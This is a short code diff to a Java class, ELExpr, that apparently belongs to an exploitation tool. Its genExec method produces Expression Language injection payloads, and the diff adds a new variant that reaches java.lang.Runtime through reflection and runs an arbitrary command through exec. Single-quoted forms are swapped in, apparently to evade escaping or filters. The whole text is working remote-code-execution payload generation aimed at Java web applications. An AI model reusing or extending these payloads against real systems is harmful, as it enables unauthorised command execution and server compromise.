@@ -49,7 +49,8 @@ public class ELExpr implements IExpr {
     public String[] genExec(String command) {
         return new String[]{
                 out("Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\")"),
-                out("\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec('" + escape(command, "'") + "')")
+                out("''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'" + escape(command, "'") + "')"),
+                out("''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('" + escape(command, "'") + "')")
         };
     }
 
